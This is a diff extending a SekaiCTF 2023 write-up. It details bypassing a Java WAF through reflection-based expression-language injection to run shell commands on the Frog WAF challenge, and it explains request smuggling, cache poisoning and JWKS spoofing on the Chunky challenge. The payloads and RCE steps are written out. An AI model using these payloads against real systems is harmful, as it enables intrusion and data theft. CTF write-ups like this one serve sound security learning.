@@ -361,7 +361,7 @@ public enum AttackTypes {
         this.attackStrings = attackStrings;
     }
 
-}ally
+}
 ```
 
 **WAF Filters Summary**
@@ -369,35 +369,380 @@ public enum AttackTypes {
 OK, now we got a really restrictive filter for a lot of kinds of attacks.
 Let's check our previous payload using some of the forbidden keywords.
 
-- **Payload**
+**Payload**
 
 `${".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}`
 
-- **Response**
+**Response**
 
 `Malicious input found: Optional[WafViolation(attackType=SQLI, attackString=&quot;)]`
 
-Let's make it a little simpler:
+The reponse comes as HTML, because we're blocked by the WAF. Let's make it a little simpler:
 
-- **Payload**
+**Payload**
 
 `${java.lang.Runtime}`
 
-- **Response**
+**Response**
 
 `Optional[WafViolation(attackType=JAVA_INJECTION, attackString=Runtime)]`
 
 Some words shall not be spoken.
 
-![](https://i.imgur.com/u6Y7CnU.png)
+![](https://i.imgur.com/e3lSaLz.png)
 
-### Hacking bit by bit
+### Bypassing the Java WAF - bit by bit
 
+* **Building blocks**
 
+Although the WAF blocks a lot of important keywords and chars, it allows us some basic important chars:
+- Parentheses: `()`
+- Dot: `.`
+- Brackets: `[]`
+- Words outside the blacklist: `lang, size, ..`
+- WAF is also case-sensitive (we didn't need it, but could help)
+
+We have to build from here, using [Java Reflection](https://www.baeldung.com/java-reflection), but it gives us a lot of powers.
+
+* **Key Classes**
+
+First of all, two classes will help us get the rest:
+- `java.lang.String` (showed in the first payload)
+- `java.lang.Class`
+
+To get the Class, we just need another getClass():
+
+**Payload**
+
+`${message.getClass().getClass().toString()}`
+
+**Response**
+
+`class java.lang.Class is not a valid country`
+
+- **Numbers**
+
+We can avoid a lot of basic strings, but we really need numbers.
+We came out with a simple (but verbose) solution, using array sizes.
+
+**Payload**
+
+`${[null, null, null, null].size()}`
+
+**Response**
+
+`4 is not a valid country`
+
+- **Dynamic Methods -> Class.forName**
+
+We can call dynamic methods from classes using the `getMethods` method and acessing them by their index.
+
+For finding classes by name to instantiate, we would like to use the Class.forName method, but the `for` and `Name` strings are blocked.
+
+Since forName is the 2nd method of Class, we call get the method by Index.
+
+**Payload**
+
+`${message.getClass().getClass().getMethods()[[null, null].size()]}`
+
+**Response**
+
+`public static java.lang.Class java.lang.Class.forName(java.lang.String) throws java.lang.ClassNotFoundException is not a valid country`
+
+We had to loop through some classes methods to find the right indexes.
+Using this same concept, we can call the substring method, from the String class we already have access.
+
+- **Strings - Part 1**
+
+As with numbers, we need strings to compose our calls (like class names for the Class.forName call).
+We can't just send strings, because single and double quotes are blocked. We need some existing strings.
+
+At first we have the `message` variable, but we don't have enough of the alphabet in there.
+
+It gets complex here to summarize, but let's try.
+Since we can navigate on all methods and fields from classes `java.lang.String` and `java.lang.Class`, and convert their names to String, we can use the substring on them to get most of the alphabet.
+
+To do it, we first built a [dicionary of substring origins](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/61cea40d2db6b2ac14a2652e0b559e7e24225c23/web-frog-waf/2-exploit.py#L69) to compose strings.
+
+Since the plus-sign is also blocked, we can use `String.concat` to make the magic.
+
+It would be something like that ("simplified" version):
+
+`message.getClass().getMethods()[12].toString().substring(12,1).concat(message.getClass().getMethods()[14].toString().substring(40,1))`...
+
+![](https://i.imgur.com/ziPfmEl.png)
+
+- **Strings - Part 2**
+
+Now we don't have all ASCII table, but we have enough alphabet to use `java.lang.Character.toString(int char)`. We can call the constructors by index just like we did before with method indexes.
+
+That would be something like that to get ASC `A`:
+
+`Class.forName("java.lang.Character").getMethods()[5].invoke(null, 65)`
+
+Now we can write a [complete string generator](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/61cea40d2db6b2ac14a2652e0b559e7e24225c23/web-frog-waf/2-exploit.py#L116), with any char, bypassing WAF restrictions.
+
+Now we can instantiate any class and call any methods, with any strings and numbers as parameters.
+
+### Running commands
+
+Now we can compose the components to use `java.lang.Runtime` to RCE. The plan is to use something like that below.
+
+```java
+${message.getClass().forName("java.lang.Runtime").getRuntime().exec("ls")}
+```
+
+We need to also read the result of the command, so we have to compose the result of the read (assuming 1-line result, to simplify):
+
+```java
+${
+    new BufferedReader(
+	    new InputStreamReader(
+            message.getClass().forName("java.lang.Runtime").getRuntime().exec("ls -l").getInputStream()
+        )
+    ).readLine();
+}
+```
+
+When calling `ls -l`, we got the first line.
+
+`total 68 is not a valid country`
+
+This is the number of files in the `/` directory.
+RCE is here. Almost there.
+
+### Get the Flag!
+
+For a reason I didn't know at challenge time, commands with some special bash characters (`*`, `|`) were not working. Since the flag name is random, we need to find it.
+
+[Rafael](https://twitter.com/musebreakz) came out with a `find` by permission to get just the flag file name in the first result line.
+
+```bash
+find / -maxdepth 1 -type f -perm 0664
+```
+
+Result:
+
+`/flag-7662fe897b3335f35ff4c3c81b9e6371.txt`
+
+Now, let's just cat it (locally):
+
+`SEKAI{7357_fl46} is not a valid country`
+
+On the challenge server:
+
+`SEKAI{0h_w0w_y0u_r34lly_b34t_fr0g_wAf_c0ngr4ts!!!!}`
+
+**[Final Exploit](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/2-exploit.py)**
+
+Fun for the whole CTF Family!
+
+### Takeaways
+
+The solution could be probably simpler on the Java side.
+For reading the process output, I could maybe use simpler solutions or maybe read all of the output.
+
+Java has some cool modern stuff, but I know Java from darker times.
+
+Also the final payload got huge! (120k chars)
+
+I saw a much smaller one (24k chars) on Discord.
+
+Just saw the [official solution](https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py) and I think we got somewhat close :) Their solution for numbers was MUCH better.
 
 ## Challenge: Chunky (16 solves)
 
 ![](https://i.imgur.com/yWbxMYQ.png)
+
+### First-Look
+
+![](https://i.imgur.com/uYaDgOW.png)
+
+![](https://i.imgur.com/mZLufkQ.png)
+
+We basically create posts here and we can see the post content on a URL with the format:
+
+`http://localhost:8080/post/<user_uuid>/<post_uuid>`
+
+On my sample:
+
+`http://localhost:8080/post/0c0b30cf-3d4b-470c-8486-e90ef9d6a778/ffce8a86-652c-4c70-88bb-afa6e182301e`
+
+This is not an XSS challenge, so we will look for a more direct attack.
+
+The post itself is just a boring concatenation of the title with the content.
+
+### Architecture
+
+![](https://i.imgur.com/A6T6epT.png)
+
+- We only have access to the Cache Layer
+    - It's a Golang App.
+    - Caches contents, except for the Flag.
+- There is an nginx as the upstream for the cache
+- The Python App is the upstream for the nginx
+
+### Flag Location - Admin
+
+Let's find our objective here: the flag is available only on the blog app. Since there is a lot of code, I wont go into details, but there is a `/admin` path that we need to understand:
+
+```python
+from flask import Blueprint, request, session
+import os
+import jwt
+import requests
+
+admin_bp = Blueprint("admin", __name__, url_prefix="/admin")
+jwks_url_template = os.getenv("JWKS_URL_TEMPLATE")
+
+valid_algo = "RS256"
+
+
+def get_public_key_url(user_id):
+    return jwks_url_template.format(user_id=user_id)
+
+
+def get_public_key(url):
+    resp = requests.get(url)
+    resp = resp.json()
+    key = resp["keys"][0]["x5c"][0]
+    return key
+
+
+def has_valid_alg(token):
+    header = jwt.get_unverified_header(token)
+    algo = header["alg"]
+    return algo == valid_algo
+
+
+def authorize_request(token, user_id):
+    pubkey_url = get_public_key_url(user_id)
+    if has_valid_alg(token) is False:
+        raise Exception(
+            "Invalid algorithm. Only {valid_algo} allowed!".format(
+                valid_algo=valid_algo
+            )
+        )
+
+    pubkey = get_public_key(pubkey_url)
+    print(pubkey, flush=True)
+    pubkey = "-----BEGIN PUBLIC KEY-----\n{pubkey}\n-----END PUBLIC KEY-----".format(
+        pubkey=pubkey
+    ).encode()
+    decoded_token = jwt.decode(token, pubkey, algorithms=["RS256"])
+    if "user" not in decoded_token:
+        raise Exception("user claim missing!")
+    if decoded_token["user"] == "admin":
+        return True
+
+    return False
+
+
+@admin_bp.before_request
+def authorize():
+    if "user_id" not in session:
+        return "User not signed in!", 403
+
+    if "Authorization" not in request.headers:
+        return "No Authorization header found!", 403
+
+    authz_header = request.headers["Authorization"].split(" ")
+    if len(authz_header) < 2:
+        return "Bearer token not found!", 403
+
+    token = authz_header[1]
+    if not authorize_request(token, session["user_id"]):
+        return "Authorization failed!", 403
+
+
+@admin_bp.route("/flag")
+def flag():
+    return os.getenv("FLAG")
+```
+
+The `/admin/flag` give us the flag, but the price is an Authorization header with JWT token. This token should be signed with a private RSA key, which we don't have.
+
+The public key for decoding is available for us at the URL:
+
+`http://localhost:8080/any_string/.well-known/jwks.json`
+
+The `any_string` is supposed to be a user uuid, but it does not validate it.
+
+```json
+{
+    "keys": [
+        {
+            "alg": "RS256",
+            "x5c": [
+                "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqwbbx3Ih7YDR+GB9kX+3\nZ/MXkVyj0Bs+E1rCph3XyAEDzft5SgK/xq4SHO48RKl+M17eJirDOnWVvHqnjxyC\nig2Ha/mP+liUBPxNRPbJbXpn9pmbYLR/7LIUvKizL9fYdYyQnACLI1OdAD/PKLjQ\nIAUGi6a8L37VQOjmf6ooLOSwKdNq/aM4eFpciKNZ3gO0YMc6SC17Jt/0L9aegxqt\nVwEXQou1/yisLuzEY6LmKEbTXuX9oSVFzd/FXi2xsLrD4nqI/HAiRoYnK1gAeglw\nF23h8Hc8jYoXgdZowt1+/XuDPfHKsP6f0MLlDaJAML2Ab6fJk3B1YkcrAZap4Zzu\nAQIDAQAB"
+            ]
+        }
+    ]
+}
+```
+
+OK, the public key is there, but we can't do nothing to use it.
+
+Some things to note here: 
+- It gets the validation public key from the same public URL above (with our logged user id). It works as an Authorization Server.
+- The flag Authorization is separated the autentication session, which uses a cookie.
+- To get the flag, we must call `/admin/flag`, with an Authorization Header that will decode successfully.
+
+### Request Smugling
+
+After many years of guys like you hacking stuff, modern HTTP servers have many security protections, but you can't expect that from small custom projects.
+
+When you have multiple web servers working in a chained fashion, we can try a [Request Smuggling](https://portswigger.net/web-security/request-smuggling) approach.
+
+![](https://i.imgur.com/2ptGwMh.png)
+
+I wont explain that in details because it will never get better than guys at [PortSwigger](https://portswigger.net/) did on the link above.
+
+If you want to learn even more, I suggest reading the [excellent Request Smuggling research articles](https://portswigger.net/research/request-smuggling) from PortSwigger research, mostly by the master-hacker-defcon-talker [James Kettle](https://portswigger.net/research/james-kettle) a.k.a. [albinowax](https://twitter.com/albinowax).
+
+To summarize: the custom cache uses the `Content-Length` header to know the size of the post. [Current HTTP specification](https://datatracker.ietf.org/doc/html/rfc9112#name-transfer-encoding:~:text=A%20server%20MAY%20reject%20a%20request%20that%20contains%20both%20Content%2DLength%20and%20Transfer%2DEncoding%20or%20process%20such%20a%20request%20in%20accordance%20with%20the%20Transfer%2DEncoding%20alone) says that `Transfer-Encoding` is prioritized over `Content-Length`, but our custom cache just ignored that.
+
+Nice, we can smuggle requests...
+
+![](https://i.imgur.com/vfYaEeT.png)
+
+### Cache Poisoning
+
+One of the options available with Request Smuggling is [Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning).
+
+While smuggling the second request `(B)` inside the first one `(A)`, the backend tries to send the `(B)` response, but the font-end does not read it, because it is supposed to have sent the complete answer.
+
+When we send a third request `(C)`, the front-end send it to the backend, but receives the response from `(B)`, which is still enqueued!
+
+If the front-end is a cache - our scenario - it caches the content of `(B)` for the URL of `(C)`.
+
+![](https://i.imgur.com/WA10pDu.png)
+
+OK, let's try it prettier.
+
+![](https://i.imgur.com/WHSSP7y.jpg)
+
+Since this concept may be hard to follow, let's follow the flow on the numbers.
+If you look as vertices 4 and 9, we have our first desync: cache sends 1 request, but nginx understands that as 2.
+That will result, later, in the vertice 16, where the answer to `/post/C` will be the response of `/post/B` that is waiting to be written to the socket from nginx.
+
+That means, future GETs to post C will get the content of B.
+
+But... we still need to use it to get the flag.
+
+### JWKS Spoofing
+
+Since we have a plan to control the contents of some URLs through Cache Poisoning, we can poison our user JWKS URL with a controlled content.
+
+Now we can use a kind of [JWKS Spoofing](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jwks-spoofing),
+creating a post content with the same format of the JWKS from the app, but using a public key from a pair created by us :)
+
+Let's view the same diagram again, but with this plan.
+
+![](https://i.imgur.com/Mbgwxbq.jpg)
+
+Now we have a plan.
+
 
 ## References
 * Team: [FireShell](https://fireshellsecurity.team/)
@@ -405,5 +750,6 @@ Some words shall not be spoken.
 * Follow me too :) [@NeptunianHacks](https://twitter.com/NeptunianHacks)
 * [Hacktricks - RCE with Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language#rce)
 * [WAF](https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/)
+* [Java Reflection](https://www.baeldung.com/java-reflection)
 * [Repo with artifacts discussed here](https://github.com/Neptunians/sekai-ctf-2023-web-writeup)
 * [Team Project Sekai](https://sekai.team/)
